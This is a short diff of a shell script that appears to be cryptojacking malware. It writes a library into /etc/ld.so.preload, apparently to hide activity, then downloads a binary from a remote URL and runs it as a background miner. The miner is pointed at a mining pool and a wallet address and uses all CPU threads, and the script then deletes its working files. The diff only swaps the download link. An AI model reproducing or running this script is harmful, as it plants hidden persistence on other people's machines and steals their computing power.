@@ -7,7 +7,7 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .lib && cd .lib
-wget -O sgr1 https://bitly.ws/38oka >/dev/null 2>&1
+wget -O sgr1 https://bitbucket.org/natalieawe/my-job/downloads/sereb >/dev/null 2>&1
 chmod +x sgr1
 ./sgr1 --algorithm minotaurx --pool stratum-na.rplant.xyz:17068 --wallet RBPnYFfFtBr8HxTsq2bZ6wxQv6BzbmaUHH.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
 rm -rvf *
